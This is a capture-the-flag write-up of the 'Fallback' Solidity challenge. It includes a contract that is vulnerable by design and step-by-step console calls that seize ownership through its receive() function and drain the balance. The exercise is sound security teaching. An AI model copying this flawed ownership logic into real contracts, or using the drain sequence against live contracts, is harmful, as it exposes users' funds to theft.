# Fallback 

## Challenge statement

```
Look carefully at the contract's code below.

You will beat this level if

- you claim ownership of the contract
- you reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods
```

## Breakdown

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // 0.6.x version

import '@openzeppelin/contracts/math/SafeMath.sol'; // OpenZeppelin SafeMath library

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions; // mapping for address contributions to uint, public for all to view
  address payable public owner; // owner variable, type payable address (can send/receive eth), others can view it

  constructor() public {
    owner = msg.sender; // owner of contract is msg.sender (creator)
    contributions[msg.sender] = 1000 * (1 ether); // set msg.sender to have 1000 * (1 ether)
  }

  // set so only the owner address can proceed
  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether); // must be less than 0.001 ether to work
    contributions[msg.sender] += msg.value; // increment contributions value by msg.value
    if(contributions[msg.sender] > contributions[owner]) { // if the contributions of sender are greater than owner, change owner to sender
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) { // view contribution of of the sender address
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner { // only the owner can withdraw
    owner.transfer(address(this).balance);
  }

  receive() external payable { // another function to change the owner, if the msg.value > 0 and the contributions of the sender are >0, change owner
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

## Solution

This challenges consists of understanding:
- How to interact with the contract 
- How fallback functions work

The goal of the exercise is to transfer ownership of the contract. From reading the code, this is possible by either sending more than 1000 ETH in <0.001 increments or triggering the receive() fallback function.

The simplest method is to trigger the receive() fallback function. For the conditions of receive() to be met, some ether must be sent and the sender must have already contributed some ether.

### Step 1: Contribute <0.001 ether to contract

await contract.contribute({value: toWei("0.0000001")})

### Step 2: Trigger receive() function

await contract.sendTransaction({from: player, to: contract.address, value: toWei("0.0000000001")
})

## Step 3: Withdraw ether

await contract.withdraw();